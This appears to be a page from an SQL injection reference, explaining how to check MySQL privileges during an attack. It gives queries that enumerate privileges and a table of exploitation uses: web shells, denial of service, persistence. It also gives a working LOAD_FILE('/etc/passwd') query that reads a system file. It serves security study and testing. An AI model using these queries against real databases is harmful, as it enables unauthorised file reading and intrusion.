---
title: Privileges
description: Understanding and checking MySQL privileges for SQL injection attacks
category: Information Gathering
order: 14
tags: ["privileges", "permissions", "file access"]
lastUpdated: 2025-03-15
---

## Privileges

Understanding MySQL privileges is crucial for determining what actions are possible during an SQL injection attack. Privilege information can reveal whether you can access files, execute commands, or perform other sensitive operations.

### Checking Current User Privileges

To check what privileges the current database user has:

```sql
SELECT privilege_type FROM information_schema.user_privileges WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'");
```

For checking privileges on specific databases:

```sql
SELECT privilege_type FROM information_schema.schema_privileges WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'");
```

For table-specific privileges:

```sql
SELECT privilege_type FROM information_schema.table_privileges WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'");
```

### Important Privileges to Check

| Privilege        | Description                      | Exploitation Potential                       |
| ---------------- | -------------------------------- | -------------------------------------------- |
| `FILE`           | Allows reading and writing files | Read sensitive files; write web shells       |
| `SUPER`          | Administrative privilege         | Execute commands; manipulate server settings |
| `SHUTDOWN`       | Can shutdown the database        | Denial of service                            |
| `CREATE USER`    | Can create new users             | Create privileged users for persistence      |
| `PROCESS`        | Can see all processes            | View queries from other users                |
| `RELOAD`         | Can reload server settings       | Can flush privileges                         |
| `ALL PRIVILEGES` | All privileges (admin)           | Complete database control                    |

### Checking for FILE Privilege

The FILE privilege is particularly important as it allows reading from and writing to files on the server:

```sql
-- Quick check for FILE privilege
SELECT COUNT(*) FROM mysql.user WHERE user = SUBSTRING_INDEX(USER(), '@', 1) AND File_priv = 'Y';
```

Or more generally using information_schema:

```sql
SELECT 1 FROM information_schema.user_privileges WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'") AND privilege_type = 'FILE';
```

### Checking for Specific Capabilities

#### Can you read files?

```sql
-- Returns 1 if you can read files
SELECT (SELECT COUNT(*) FROM mysql.user WHERE user = SUBSTRING_INDEX(USER(), '@', 1) AND File_priv = 'Y') > 0;
```

#### Can you write files?

```sql
-- Same check as reading files (FILE privilege covers both)
SELECT (SELECT COUNT(*) FROM mysql.user WHERE user = SUBSTRING_INDEX(USER(), '@', 1) AND File_priv = 'Y') > 0;
```

### Checking All Privileges at Once

```sql
-- Show all privileges for current user
SELECT * FROM mysql.user WHERE user = SUBSTRING_INDEX(USER(), '@', 1);
```

### Practical Usage

If you have the FILE privilege, you can:

- Read sensitive files like `/etc/passwd` using `LOAD_FILE()`
- Write web shells using `INTO OUTFILE`
- Access database configuration files

### Example: Checking and Using FILE Privilege

```sql
-- Check if we have FILE privilege
SELECT IF((SELECT COUNT(*) FROM mysql.user WHERE user = SUBSTRING_INDEX(USER(), '@', 1) AND File_priv = 'Y') > 0, 'Yes, we can read/write files', 'No file privileges');

-- If yes, try reading a sensitive file
SELECT LOAD_FILE('/etc/passwd');
```

### Note

The actual privileges available to you depend on:

1. The MySQL version
2. Server configuration
3. User account configuration
4. Whether you're connecting from localhost or remotely
